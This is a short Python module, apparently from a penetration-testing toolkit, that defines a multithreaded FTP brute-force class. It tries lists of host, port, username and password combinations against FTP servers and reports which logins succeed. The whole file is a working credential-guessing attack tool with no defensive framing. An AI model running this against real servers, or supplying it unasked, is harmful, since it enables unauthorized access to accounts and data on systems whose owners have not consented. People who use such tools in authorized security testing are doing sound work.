#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
@Author: reber
@Mail: reber0ask@qq.com
@Date: 2019-09-25 21:11:15
@LastEditTime: 2019-12-13 16:30:55
'''

from ftplib import FTP
from concurrent.futures import ThreadPoolExecutor


class FtpBruteForce(object):
    """FtpBruteForce"""
    def __init__(self, targets, thread_num, timeout):
        super(FtpBruteForce, self).__init__()
        self.targets = targets
        self.thread_num = thread_num
        self.timeout = timeout
        self.result = list()

    def worker(self,hpup):
        host,port,user,pwd = hpup
        try:
            ftp = FTP()
            ftp.connect(host, port, timeout=self.timeout)
            ftp.login(user=user, passwd=pwd)
        except Exception as e:
            hook_msg((False,host,port,user,pwd))
        else:
            hook_msg((True,host,port,user,pwd))
        finally:
            ftp.close()

    def run(self):
        with ThreadPoolExecutor(max_workers = self.thread_num) as executor:
            for host,port,user,pwd in self.targets:
                f = executor.submit(self.worker,(host,port,user,pwd))
                # f.add_done_callback(call_back)


bruter = FtpBruteForce

